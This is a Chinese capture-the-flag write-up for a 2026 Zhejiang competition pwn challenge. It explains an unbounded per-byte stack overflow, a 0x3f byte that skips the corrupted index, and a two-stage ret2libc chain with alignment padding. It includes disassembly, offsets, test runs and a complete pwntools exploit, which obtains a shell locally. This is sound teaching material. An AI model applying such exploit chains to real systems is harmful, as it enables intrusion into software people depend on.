# pwn「栈溢出」— 逐字节读越界写，用 `0x3f` 跳过被自己压掉的 `idx`

> 2026 浙江省大学生网络安全竞赛 · 分类：Pwn · 难度：★★★☆☆

| 项目 | 内容 |
|---|---|
| 题目名 | `pwn`（题面只有一句 `Welcome to the 2026 ZJ University Student Cybersecurity Competition!`） |
| 分类 | Pwn / 栈溢出（逐字节越界写 + 两段 ret2libc） |
| 附件 | `PWN附件/附件.zip`（1,071,450 字节），内含 `pwn`（15,984）、`libc.so.6`（2,220,400）、`ld-linux-x86-64.so.2`（240,936） |
| 一句话 | `input()` 逐字节 `read` 且 `idx` 没有上界检查；写到 `buf+0x3c` 时正好压掉 `idx` 自己的低字节，送一个 `0x3f` 就把写指针顶到 `0x40`（saved rbp），于是能一路覆盖返回地址 |
| 结果 | 本地打通（随包 `ld`+`libc` 下拿到 shell，见 3.6）；附件里没有任何远端地址，没有 flag —— 见第六节 |

**最终答案**

```
未获取（附件只带 pwn / libc.so.6 / ld-linux-x86-64.so.2，无 nc 地址；本地验证到 shell，没读到 flag）
```

## 一、题目长什么样（先建立直觉）

附件是标准三件套：15,984 字节的 ELF `pwn`，加上题目自带的 `libc.so.6` 与 `ld-linux-x86-64.so.2`。给 loader 的意思很明确——按它的 libc 打，别拿本机凑。程序小到只有 `input`、`set_first_arg`、`main` 三个自己的函数，符号一个没剥；跑起来就是一句 banner、读一串字节、遇换行 `puts("received")` 后返回。没有菜单，漏洞只能在「读」这一步。

```text
$ printf 'hello_from_test\n' | ./ld-linux-x86-64.so.2 --library-path . ./pwn
Welcome to the 2026 ZJ University Student Cybersecurity Competition!
received
exit=0
```

保护用 `readelf` 实测：

```text
$ readelf -h pwn | grep Type
  Type:                              EXEC (Executable file)
$ readelf -lW pwn | grep -E 'GNU_STACK|GNU_RELRO'
  GNU_STACK      0x000000 ... 0x000000 0x000000 RW  0x10
  GNU_RELRO      0x002dc0 ... 0x000240 0x000240 R   0x1
$ readelf -dW pwn | grep -E 'BIND_NOW|FLAGS_1'
 0x000000000000001e (FLAGS)              BIND_NOW      # 另有 FLAGS_1: NOW
```

四条结论：**非 PIE**（`EXEC`，基址固定 0x400000）、**NX 开**（`GNU_STACK` 只有 `RW`）、**Full RELRO**（`BIND_NOW` + `GNU_RELRO` 覆盖到 0x404000，正好包住 `.got`）、**无 canary**（无 `__stack_chk_fail`，`input` 结尾是裸 `leave; ret`）。非 PIE + 无 canary，意味着写指针一旦摸到返回地址，链子就能用常数拼出来。libc 版本也当场核过，别按 2.27 的记忆瞎打：

```text
$ strings -a libc.so.6 | grep -m1 "GNU C Library"
GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.15) stable release version 2.35.
```

## 二、思路总览

先给结论：**难点不是 ROP，而是先把写指针搬到返回地址上**。缓冲区只有 0x40 字节，`idx` 恰好躺在缓冲区末尾的 `rbp-0x4`（即 `buf+0x3c`）——越界写到第 0x3d 个字节时，第一个被写坏的就是「记录写到哪了」的那个变量，链子是自毁式的。

```text
① 写 0x3c 个填充 → 下一字节落在 buf+0x3c（idx 低字节）
   ↓ 送 0x3f：idx = 0x3f + 1 = 0x40，跳到 saved rbp，跳过 idx 剩下 3 字节
② 从 buf+0x40 起连续写：8 字节 saved rbp + ROP 链，一直写到 ret 槽
③ stage1：pop rdi; puts@got; puts@plt; main —— 泄漏 libc，回 main 再走一遍 input()
④ stage2：pop rdi; libc 里的 "/bin/sh"; system —— 拿 shell
⑤ 两段链的 ret 填充数必须「一 0 一 1」，否则 system 入口 16 字节不对齐直接崩
```

第 ⑤ 步最容易翻车：第一段的 `ret` 填充会翻转 `main` 入口的对齐，而 `main` 又把这 8 字节原样带进第二次 `input`，所以第二段必须用相反填充数抵消回来。实测四组合只有两种能通。

## 三、逐步复现

### 3.1 第一步：把 `input()` 读成 C

`objdump -d -M intel pwn` 里 `input()` 的关键几行（摘录，机器码列已略）：

```text
000000000040117f <input>:
  401187:	sub    rsp,0x40                 ; buf 在 rbp-0x40
  401192:	mov    DWORD PTR [rbp-0x4],0x0 ; idx 在 rbp-0x4
  401199:	lea    rdx,[rbp-0x40]            ; 40119d: mov eax,[rbp-0x4]
  4011a2:	add    rax,rdx                 ; buf + idx（cdqe 符号扩展）
  4011b2:	call   401070 <read@plt>       ; read(0, buf+idx, 1)
  4011c2:	movzx  eax,BYTE PTR [rbp+rax*1-0x40]
  4011c9:	je     4011d1 <input+0x52>     ; cmp al,0xa 相等 → puts("received")
  4011cb:	add    DWORD PTR [rbp-0x4],0x1 ; idx++
  4011cf:	jmp    401199 <input+0x1a>
  4011d7:	call   401060 <puts@plt>
  4011df:	leave                             ; 4011e0: ret
```

```c
void input(void) {
    char buf[0x40];  int unused;  int idx = 0;      /* rbp-0x40 / -0x8 / -0x4 */
    while (1) {
        if (read(0, buf + idx, 1) != 1) break;      /* 长度写死 1 */
        if (buf[idx] == '\n') { puts("received"); break; }
        idx++;                                      /* 唯一的边界检查：没有 */
    }
}
```

三件事：`read` 长度写死 1，所以「读多少」没有上限；`idx` 是**有符号 32 位**，`cdqe` 符号扩展后加到缓冲区地址上；越界没有任何检查。`main` 也很素：`setvbuf(stdout, NULL, 2, 0)`（`_IONBF`，`puts` 立刻出去，脚本可放心 `recvuntil`）→ `puts(banner)` → `call input`。

### 3.2 第二步：画出精确的栈偏移表

| 偏移 | 内容 | 越界写到这里会怎样 |
|---|---|---|
| `0x00 ~ 0x37` | `buf` 有效数据 | 正常 |
| `0x38 ~ 0x3b` | `rbp-0x8` 那个废弃 int | 无影响（没人读） |
| `0x3c ~ 0x3f` | `idx` 本身（小端 4 字节） | **写指针被自己改写** |
| `0x40 ~ 0x47` | saved rbp | `leave` 时弹进 rbp |
| `0x48 ~ ...` | 返回地址 → `main+0x35`（0x401216） | `ret` 直接跳走 |

即：**返回地址在 `0x48`，但 `0x3c` 是雷区**。老实一字节一字节往下写，写到 `0x3c` 就把 `idx` 低字节改成「刚送进去的字节」，随后 `idx++`——写指针瞬间飞走，链子错位。

### 3.3 第三步：`0x3f` 这个数字是怎么推出来的

`idx = 0x3c` 时：`read(0, buf+0x3c, 1)` 把字节 `b` 写进 `idx` 低字节（另 3 字节本来就是 0）；`movzx` 把 `b` 读回来和 `0x0a` 比一次；然后 `add DWORD PTR [rbp-0x4],1` → **`idx` 变成 `b + 1`**。要落在 saved rbp（`0x40`）上，方程只有唯一解：`b + 1 = 0x40` → **`b = 0x3f`**。这一个字节既当填充，又把写指针往前跳 4 格，正好跳过 `idx` 剩下的 `0x3d ~ 0x3f`；此后 `idx` 单调递增，再也不会回头踩 `0x3c`。

反例是实测的（拿普通字节代替 `0x3f`）：

```text
skip=0x3f idx_after=0x40 out=b'\x10\x0e\xae\xa0\xa1\x7f\nWelcome to the 2026 ZJ ...' exit_status=None
skip=0x43 idx_after=0x44 out=b'<EOF>' exit_status=-11
skip=0x41 idx_after=0x42 out=b'<EOF>' exit_status=-11
```

`0x3f`：泄漏成功、`main` 又打了一遍 banner、进程还活着等下一次输入；`0x41`/`0x43`：写指针落到 `0x42`/`0x44`，链整体错位 2~4 字节，进程直接 SIGSEGV（`-11`）。

### 3.4 第四步：清点 gadget

保护见第一节的四条结论：非 PIE + NX + Full RELRO + 无 canary。Full RELRO 只挡「写 GOT」，读 GOT 完全没问题——`puts(puts@got)` 照样能把 libc 地址打出来。可用常数（全部来自实测反汇编与重定位）：

| 名字 | 地址 | 出处 |
|---|---|---|
| `pop rdi; ret` | `0x40117a` | `set_first_arg`：`40117a: 5f` / `40117b: c3` |
| `ret`（对齐用） | `0x40101a` | `_init` 尾巴 `40101a: c3` |
| `puts@plt` | `0x401060` | `objdump` 的 `puts@plt` 段 |
| `puts@got` | `0x403fd8` | `readelf -rW`：`R_X86_64_JUMP_SLOT puts`（`read@got=0x403fe0`、`setvbuf@got=0x403fe8` 备用） |
| `main` | `0x4011e1` | `readelf -sW` |

这些地址的 8 字节小端形式里都没有 `0x0a`（`7a 11 40`、`d8 3f 40`、`60 10 40`、`e1 11 40`、`1a 10 40`），不会被 `input` 的换行判断截断——这一条必须逐字节检查，见第五节。

### 3.5 第五步：从随包 libc 里挖偏移

```text
$ readelf -sW libc.so.6 | grep -E '\b(system|puts|__libc_start_main)@@GLIBC'
   674: 0000000000029dc0   328 FUNC    GLOBAL DEFAULT   15 __libc_start_main@@GLIBC_2.34
  1429: 0000000000080e10   409 FUNC    WEAK   DEFAULT   15 puts@@GLIBC_2.2.5
  1481: 0000000000050d70    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5
```

`"/bin/sh"` 不在符号表里只能扫字节；`libc.so.6` 第一个 `PT_LOAD` 是 `vaddr == offset == 0`，文件偏移即虚拟偏移。汇总：`puts=0x80e10`、`system=0x50d70`、`setvbuf=0x815b0`、`__libc_start_main=0x29dc0`、`"/bin/sh"=0x1d8678`。**版本必须强调**：本题是 `GLIBC 2.35-0ubuntu3.15`，2.27 那套 `system=0x4f440`、`main_arena=0x3ebc40`、`__free_hook=0x3ed8e8` 一个都不能用；另外 `readelf -sW libc.so.6 | grep hook` 在 2.35 上还能查到 `__malloc_hook@0x2214a0`、`__free_hook@0x2214a8`，但它们从 2.34 起已降级成兼容符号，malloc/free 不再调用，写进去没有效果——「写 hook 换 system」这条线在这道栈题里不成立。

### 3.6 第六步：两段链、对齐，以及现场脚本的一个 bug

```python
def build(chain):        # 0x3c 填充 + 0x3f 把 idx 顶到 0x40 + 8 字节 saved rbp + 链
    return b'A' * 0x3c + b'\x3f' + b'B' * 8 + chain + b'\n'
chain1 = p64(RET) * PAD1 + p64(POP_RDI) + p64(PUTS_GOT) + p64(PUTS_PLT) + p64(MAIN)
chain2 = p64(RET) * PAD2 + p64(POP_RDI) + p64(base + BINSH) + p64(base + SYSTEM)
```

**现场留下的 `test_align.py` 有个真实 bug**：`p.send(payload)` 之后直接 `recvline()` 读泄漏，忘了 `input()` 遇换行会先 `puts("received")`。于是读到的是回显而不是地址（`len=8` 就是 `received` 的 8 个字符），四个组合全军覆没：

```text
pad1=0 pad2=0 -> leak_bad(len=8)
pad1=1 pad2=1 -> leak_bad(len=8)      # 另外两组同样 len=8；脚本抬头的偏移打印与 3.5 相同，略
```

改成「先 `recvuntil(b'received\n')` 再 `recvline()`」，四组合立刻分化：

```text
pad1=0 pad2=0 -> leak=ok(0x7f8825200000) banner2=ok shell=EOF exit=-11
pad1=0 pad2=1 -> leak=ok(0x7f355f7b0000) banner2=ok shell=YES exit=None
pad1=1 pad2=0 -> leak=ok(0x7f9008990000) banner2=ok shell=YES exit=None
pad1=1 pad2=1 -> leak=ok(0x7f9fc31a0000) banner2=ok shell=EOF exit=-11
```

读法很关键：**四种组合的 stage1 都成功了**（泄漏 6 字节、`main` 重新打印 banner），说明 `puts` 入口没对齐也照样跑得过，死的是 stage2 的 `system`。能拿 shell 的只有 `(0,1)` 和 `(1,0)`——两段链填充数必须相反，因为 `ret` 填充只挪 8 字节，它翻转了 `main` 入口的对齐，而 `main` 又把这 8 字节带进第二次 `input`。最终 exp（`PAD1, PAD2 = 0, 1`）连跑三次输出一致：

```text
[+] puts@got = 0x7ff08c060e10  libc base = 0x7ff08bfe0000
[*] Switching to interactive mode
PWNED_42
```

`PWNED_42` 是 `echo PWNED_$((40+2))` 的输出，证明 `system("/bin/sh")` 真的执行了命令，不是「回显了一句 banner」。

## 四、关键知识点

| 概念 | 是什么 | 这题为什么用它 | 以后在哪还会遇到 |
|---|---|---|---|
| 逐字节 `read(0, buf+idx, 1)` | 每次只读 1 字节、落点由下标决定 | 没有长度上限，下标又是相邻局部变量 | 自己写输入函数的题；`idx` 型越界写很常见 |
| 下标自毁 / 跳过 | 写坏 `idx` 后 `idx++`，等价于「把写指针设成 `b+1`」 | 只有 `b=0x3f` 能把写指针落到 saved rbp | 溢出点与下标字段相邻的小端 `int` 场景 |
| 非 PIE + 无 canary | 代码地址固定、返回地址可直接填 | 第一轮就能写死 `0x40117a` 这些常数 | 所有 `EXEC` 类型的 ELF |
| Full RELRO | `.got` 在 `GNU_RELRO` 里，只读 | 只能「读 GOT 泄漏」，不能「改 GOT 劫持」 | 判断走 ret2libc 还是 GOT 覆写的分界线 |
| ret2libc 两段链 | 先泄漏已解析函数地址算 base，再回 `main` 打第二轮 | 一次 `input` 装不下「泄漏 + 利用」两件事 | 任何不回显地址的栈题 |
| 16 字节栈对齐 | 函数入口要求 `rsp % 16 == 8` | `system` 内部有 `movaps`，错 8 字节就崩 | 所有 64 位 ROP，尤其 `system`/`printf` |

## 五、踩坑与陷阱

- **`0x3f` 是唯一解，没有「差不多」**：`0x40` 让写指针落到 `0x41`（saved rbp 少写 1 字节），`0x3e` 落到 `0x3f`（把 `idx` 最高字节写成链子第一字节，`idx` 变天文数字、后续写直接 EFAULT）。实测 `0x41`/`0x43` 全部 `exit_status=-11`。
- **payload 里不能出现 `0x0a`，而它有两条来路**：一是自己填的地址字节（本链 5 个地址都干净，换 `read@got`/`setvbuf@got` 或远程偏移时要重扫）；二是泄漏的 6 字节里第 4 字节是基址随机位，1/256 概率是 `0x0a`，`recvline` 会提前截断，所以必须写「`len(leak) != 6` 就重跑」。
- **回显 `received` 必须先吃掉，管道还会分片**：现场 `test_align.py` 就栽在前者（四组合全部 `leak_bad(len=8)`）；后者也咬人，本次验证第一次运行出现过一次 `len=2` 的半行（同一脚本随后连跑三次全对），长度校验是必需项。
- **对齐不是「加个 ret 就对了」**：`puts` 入口错 8 字节照样能跑，`system` 错 8 字节就崩。四组合里 stage1 全过、stage2 挂两个，很容易误判成「泄漏有问题」去反复改 stage1。
- **别把 2.27 搬过来**：随包 libc 是 `2.35-0ubuntu3.15`；`__free_hook` 虽还以兼容符号存在（`0x2214a8`）但已不生效。另外 pwntools 报的 `puts@plt` 是 `0x401064`（`endbr64` 之后那条 `bnd jmp`），真正标号是 `0x401060`，两个值这里都能通，别混着记。

## 六、卡点与正解方向

**已确认的部分（有实测输出为证）**

1. 漏洞机制与偏移：`read(0, buf+idx, 1)` 逐字节读 + `idx` 无上界检查；`idx` 在 `buf+0x3c`、saved rbp 在 `buf+0x40`、ret 在 `buf+0x48`，与 `sub rsp,0x40` / `[rbp-0x4]` 完全对得上。`0x3f` 组合泄漏成功且进程存活，`0x41`/`0x43` 组合 `exit_status=-11`。
2. libc 侧：`GLIBC 2.35-0ubuntu3.15`，`puts=0x80e10`、`system=0x50d70`、`"/bin/sh"=0x1d8678`；用随包 loader 起进程后 `PAD1=0, PAD2=1` 连跑三次全部拿到 `PWNED_42`，`(1,0)` 同样可通。

**卡在哪**：附件里只有三个文件（`pwn`、`libc.so.6`、`ld-linux-x86-64.so.2`），没有 `nc host port`、没有 Dockerfile、没有 `flag` 文件。所以只能证明「能拿到 shell」，拿不到 flag 字符串——本机 `/flag` 自然也不存在。这不是技术卡点，是**缺少靶机地址**。

**正解方向（拿到远端后按这个顺序做）**

1. `python3 exp_final.py remote HOST PORT`，先试 `PAD1, PAD2 = 0, 1`；泄漏值减 `0x80e10` 必须页对齐，不对齐说明远端不是这份 libc，用泄漏值到 libc-database 反查，再换 `PUTS_OFF / SYSTEM / BINSH`。
2. 验对齐：泄漏正常、`main` 也重打 banner，但 `system` 一进去就断，就是 `PAD2` 反了，换 `(1,0)`；拿到 shell 后 `ls -l /; cat /flag* 2>/dev/null; cat flag* 2>/dev/null`。

## 七、赛场 20 分钟行动清单

1. `readelf -h/-l/-d` 三连，一次看全 PIE / NX / RELRO / `BIND_NOW`；`readelf -sW` 顺手看符号剥没剥（这题直接送出 `input`、`set_first_arg`、`main`）。
2. `objdump -d -M intel` 盯 `input` 的 `read` 长度与下标运算，记下「谁在 `rbp-0x4`」；画偏移表（`0x3c` 雷区 / `0x40` saved rbp / `0x48` ret），算出那个魔法字节。
3. `strings -a libc.so.6 | grep "GNU C Library"` 钉版本，再取 `puts/system` 与 `"/bin/sh"`；payload 落笔前扫一遍所有地址的 8 字节，确认没有 `0x0a`；最后跑四组合网格，记下「哪一段崩」，别把对齐当成泄漏问题。

> 45 分钟还停在「拿不到泄漏」，先确认是不是忘了吃 `received` 那一行——这题最常见的假故障就在这儿。

## 八、附件与脚本

现场文件在 `pwn_chal/`（只读引用，本次未改动任何文件）。跑之前先拷到 Linux 侧：`mkdir -p /tmp/pwnw && cp pwn libc.so.6 ld-linux-x86-64.so.2 /tmp/pwnw/ && chmod +x /tmp/pwnw/pwn /tmp/pwnw/ld-linux-x86-64.so.2`。

| 文件 | 作用 |
|---|---|
| `pwn_chal/pwn` | 目标 ELF（15,984 字节，`EXEC` / NX / Full RELRO / 无 canary） |
| `pwn_chal/libc.so.6` + `ld-linux-x86-64.so.2` | 随包 libc（`GLIBC 2.35-0ubuntu3.15`，本篇所有偏移出自它）与 loader（把 libc 钉成题目那一份） |
| `pwn_chal/01_recon.sh` / `probe.sh` / `run_test.sh` | 侦察（跑一遍、列 libc 符号、`ROPgadget`）、环境探测、一键跑 `test_align.py` |
| `pwn_chal/test_align.py` | 对齐网格脚本，**有「漏吃 `received`」的 bug**，见 3.6 |

本篇验证用的 `align3.py`（分阶段报告泄漏 / banner / shell / 退出码）、`exp_final.py`、`neg2.py`（对比 `0x3f`/`0x43`/`0x41`）写在系统临时目录，未污染现场。最终 exp 的核心：

```python
from pwn import *                    # libc = ELF('libc.so.6', checksec=False)
POS, RET = 0x40117a, 0x40101a        # set_first_arg: pop rdi; ret / _init 尾巴的 ret
MAIN, PUTS_PLT, PUTS_GOT = 0x4011e1, 0x401060, 0x403fd8
PUTS_OFF, SYSTEM = libc.symbols['puts'], libc.symbols['system']    # 0x80e10 / 0x50d70
BINSH = next(libc.search(b'/bin/sh\x00'))    # 0x1d8678
PAD1, PAD2 = 0, 1                            # 两段链必须一个 0 一个 1

def build(chain):
    return b'A' * 0x3c + b'\x3f' + b'B' * 8 + chain + b'\n'

p = process(['./ld-linux-x86-64.so.2', '--library-path', '.', './pwn'])
p.recvuntil(b'Competition!\n', timeout=5)
p.send(build(p64(RET) * PAD1 + p64(POS) + p64(PUTS_GOT) + p64(PUTS_PLT) + p64(MAIN)))
p.recvuntil(b'received\n', timeout=5)          # 关键：先吃掉回显
leak = p.recvline(timeout=5).rstrip(b'\n')
assert len(leak) == 6, '泄漏被截断，重跑'
base = u64(leak.ljust(8, b'\x00')) - PUTS_OFF
p.recvuntil(b'Competition!\n', timeout=5)
p.send(build(p64(RET) * PAD2 + p64(POS) + p64(base + BINSH) + p64(base + SYSTEM)))
p.recvuntil(b'received\n', timeout=5)
p.interactive()
```
